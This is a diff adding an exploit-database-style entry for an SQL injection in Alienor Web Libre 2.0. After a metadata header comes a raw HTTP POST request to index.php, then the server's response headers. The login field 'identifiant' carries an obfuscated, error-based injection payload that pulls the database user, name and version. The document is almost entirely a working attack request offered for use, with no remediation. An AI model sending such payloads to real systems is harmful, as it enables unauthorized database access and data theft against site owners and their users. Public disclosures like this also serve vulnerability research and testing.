@@ -1,0 +1,37 @@
+# Exploit Title: Alienor Web Libre 2.0 - SQL Injection
+# Dork: N/A
+# Date: 2018-11-08
+# Exploit Author: Ihsan Sencan
+# Vendor Homepage: http://alienor.org/
+# Software Link: https://excellmedia.dl.sourceforge.net/project/alienorweblibre/alienorweblibre.zip
+# Version: 2.0
+# Category: Webapps
+# Tested on: WiN7_x64/KaLiLinuX_x64
+# CVE: N/A
+
+# POC: 
+# 1)
+# http://localhost/[PATH]/index.php
+# 
+POST /[PATH]/index.php HTTP/1.1
+Host: TARGET
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Cookie: PHPSESSID=aehrspv1bfhbp1iqhkl1107vd7
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 306
+identifiant=12'||(SeleCT%20'Efe'%20FroM%20duAL%20WheRE%20110=110%20AnD%20(seLEcT%20112%20frOM(SElecT%20CouNT(*),ConCAT(CONcat(0x203a20,UseR(),DAtaBASe(),VErsION()),(SeLEct%20(ELT(112=112,1))),FLooR(RAnd(0)*2))x%20FROM%20INFOrmatION_SchEMA.PluGINS%20grOUp%20BY%20x)a))||'&mot_de_passe=&inventaire=Inventaire
+HTTP/1.1 200 OK
+Date: Thu, 08 Nov 2018 22:07:19 GMT
+Server: Apache/2.4.25 (Win32) OpenSSL/1.0.2j PHP/5.6.30
+X-Powered-By: PHP/5.6.30
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
+Pragma: no-cache
+Content-Length: 81
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+Content-Type: text/html; charset=UTF-8
